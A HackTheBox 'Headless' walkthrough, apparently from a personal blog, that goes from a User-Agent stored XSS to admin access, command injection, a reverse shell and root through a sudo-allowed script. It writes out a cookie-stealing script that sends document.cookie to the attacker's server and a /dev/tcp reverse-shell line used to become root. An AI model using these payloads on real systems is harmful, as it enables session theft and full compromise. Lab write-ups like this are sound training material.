---
title: Headless
tags:
  - HackTheBox
  - Easy
  - Linux
  - XSS
  - Blind_XSS
  - Stored_XSS
  - Command-Injection
  - Cookie-Stealing
date: 2024-09-13T00:00:00Z
---
![](Pasted%20image%2020241113190319.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.8 headless.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- headless.htb > sC.txt

[redacted]
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp
```

So I took a look at port 5000 website:

![](Pasted%20image%2020241113190550.png)

If we click on "For questions" we arrive to some kind of form:

![](Pasted%20image%2020241113190631.png)

Let's try to inject an XSS:

![](Pasted%20image%2020241113191302.png)

So I captured the petition with Burpsuite, but had the same result in the repeater. After this, I decided to inject the XSS in the `User-Agent` header:

![](Pasted%20image%2020241113191608.png)

```js
POST /support HTTP/1.1
Host: headless.htb:5000
User-Agent: <script>alert(1)</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://headless.htb:5000
Connection: keep-alive
Referer: http://headless.htb:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

fname=a&lname=a&email=a%40a&phone=a&message=%3Cscript%3Ealert(1)%3Cscript%3E
```

I don't get the Hacking message now and pop the alert!

![](Pasted%20image%2020241113194507.png)

I can now attempt to create a blind stored XSS to steal cookies with the following script:

```shell
<script>var i=new Image(); i.src="http://10.10.14.24:8090/?cookie="+btoa(document.cookie);</script>
```

```http
POST /support HTTP/1.1
Host: headless.htb:5000
User-Agent: <script>var i=new Image(); i.src="http://10.10.14.24:8090/?cookie="+btoa(document.cookie);</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://headless.htb:5000
Connection: keep-alive
Referer: http://headless.htb:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

fname=a&lname=a&email=a%40a&phone=a&message=%3Cscript%3Ealert(1)%3Cscript%3E
```

Almost inmediately I received some cookies in my python server:

```shell
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.10.14.24 - - [13/Nov/2024 19:54:07] "GET /?cookie=aXNfYWRtaW49YVhOZllXUnRhVzQ5U1c1V2VscFlTV2t1ZFVGc2JWaHNWSFp0T0haNWFXaHFUbUZRUkZkdWRrSmZXbVp6 HTTP/1.1" 200 -
10.10.11.8 - - [13/Nov/2024 19:55:04] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```

> *Remember that they are base64 encoded*

So I decoded them and got these cookies:

```txt
aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz
ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Now I decided to perform some enumeration with [dirsearch](dirsearch.md):

```shell
dirsearch -u http://headless.htb:5000 -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r

[redacted]
[19:50:36] 200 -    2KB - /support                                          
[19:50:49] 401 -  317B  - /dashboard
```

The `/dashboard` seems to be interesting, because initially we can't access to it. But maybe with the new cookie we actually can:

![](Pasted%20image%2020241113195803.png)

I got access to the Administration Dashboard!

I captured the petition with Burp and try to execute a Command Injection (which actually worked):

![](Pasted%20image%2020241113200048.png)

So I tried to inject a reverse shell:

![](Pasted%20image%2020241113200515.png)

> We've got a reverse shell!

![](Pasted%20image%2020241113200553.png)

![](Pasted%20image%2020241113200709.png)

## Privilege Escalation

I inspected the mail of the user `dvir` and found an interesting message:

```txt
cat /var/mail/dvir 
Subject: Important Update: New System Check Script

Hello!

We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.

What's special for you?
- You've been granted special privileges to use this script.
- It will help identify and resolve system issues more efficiently.
- It ensures that necessary updates are applied when needed.

Rest assured, this script is at your disposal and won't affect your regular use of the system.

If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.

By the way, we're still waiting on you to create the database initialization script!
Best regards,
Headless
```

If we run `sudo -l`:

```shell
sudo -l

[redacted]
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

I inspected the binary:

```sh
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

So basically, if we create a shell inside `initdb.sh` we will become root.

```shell
cd /dev/shm
echo "bash -i >& /dev/tcp/10.10.14.24/777 0>&1" > initdb.sh
sudo /usr/bin/syscheck
```

> We become root and got root flag!

![](Pasted%20image%2020241113201811.png)

==Machine pwned!==
